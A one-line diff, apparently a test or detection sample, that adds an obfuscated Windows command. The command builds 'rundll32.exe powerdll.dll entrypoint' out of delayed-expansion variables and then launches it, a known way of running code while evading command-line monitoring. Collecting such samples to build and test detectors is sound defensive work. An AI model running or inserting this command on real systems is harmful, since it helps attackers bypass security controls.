@@ -1,0 +1,1 @@
+@cmd /v:on /C "set 0=rundll32.exe&& set 1=powerdll.dll&& set 2=entrypoint&& start !0! !1! !2!"
